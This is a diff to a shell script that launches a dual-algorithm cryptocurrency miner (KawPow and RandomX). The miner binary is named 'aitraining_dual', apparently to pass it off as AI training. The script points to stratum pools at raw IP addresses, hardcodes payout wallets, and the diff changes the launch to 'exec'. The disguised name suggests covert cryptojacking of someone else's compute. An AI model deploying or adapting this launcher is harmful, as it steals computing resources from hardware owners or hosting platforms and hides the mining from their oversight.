@@ -12,8 +12,6 @@ if [ $CPU_THREADS -lt 1 ]; then
 fi
 
 # Export GPU environment variables (optional for kawpow)
-# Note: These are typically for OpenCL/Ethash-based mining and may not be needed
-# or effective for all miners/algorithms.
 export GPU_MAX_HEAP_SIZE=100
 export GPU_MAX_USE_SYNC_OBJECTS=1
 export GPU_SINGLE_ALLOC_PERCENT=100
@@ -28,8 +26,9 @@ export RANDOMX_USE_HW_AES=1
 # Ensure the miner executable is set to be executable
 chmod +x aitraining_dual
 
-# Execute the dual mining command
-./aitraining_dual \
+# Execute the dual mining command using 'exec' (like the working example)
+# Note: 'exec' replaces the shell process with the miner process.
+exec ./aitraining_dual \
     --algorithm "kawpow;randomx" \
     --pool "stratum+ssl://51.89.99.172:16161;stratum+ssl://51.222.200.133:10343" \
     --wallet "RM2ciYa3CRqyreRsf25omrB4e1S95waALr;44csiiazbiygE5Tg5c6HhcUY63z26a3Cj8p1EBMNA6DcEM6wDAGhFLtFJVUHPyvEohF4Z9PF3ZXunTtWbiTk9HyjLxYAUwd" \
